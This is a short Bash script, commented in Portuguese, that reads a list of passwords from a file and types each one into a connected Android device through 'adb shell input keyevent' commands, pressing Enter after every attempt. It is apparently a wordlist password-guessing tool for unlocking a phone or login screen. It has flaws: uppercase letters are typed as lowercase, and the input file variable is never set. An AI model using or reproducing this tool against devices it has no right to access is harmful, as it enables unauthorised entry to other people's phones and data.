#!/bin/bash

convert_char_to_keyevent() {
    local char="$1"
    case "$char" in
        [a-z]) echo "keyevent $(( $(printf '%d' "'$char") - 97 + 29 ))" ;; # a-z
        [A-Z]) echo "keyevent $(( $(printf '%d' "'$char") - 65 + 29 ))" ;; # A-Z
        [0-9]) echo "keyevent $(( $(printf '%d' "'$char") - 48 + 7 ))" ;; # 0-9
        ' ') echo "keyevent 62" ;; # Espaço
        *) echo "keyevent 0" ;; # Caracteres especiais não definidos
    esac
}

contador=0
while IFS= read -r line || [ -n "$line" ]; do
    password="$line"
    contador=$((contador+1))
    echo "Processando senha $contador: $password"
    
    if [ -z "$password" ]; then
        echo "Senha vazia, pulando..."
        continue
    fi
    
    for (( i=0; i<${#password}; i++ )); do
        char="${password:$i:1}"
        keyevent_cmd=$(convert_char_to_keyevent "$char")
        if [[ "$keyevent_cmd" =~ ^keyevent ]]; then
            echo "adb shell input $keyevent_cmd"
            adb shell input $keyevent_cmd
        else
            echo "$keyevent_cmd"
        fi
        
        sleep 0.1
    done
    
    echo "adb shell input keyevent 66 # Enter"
    adb shell input keyevent 66
    
    echo "Senha '$password' enviada com sucesso."
    
    sleep 1
done < "$file_path"

echo "Todas as senhas foram enviadas."
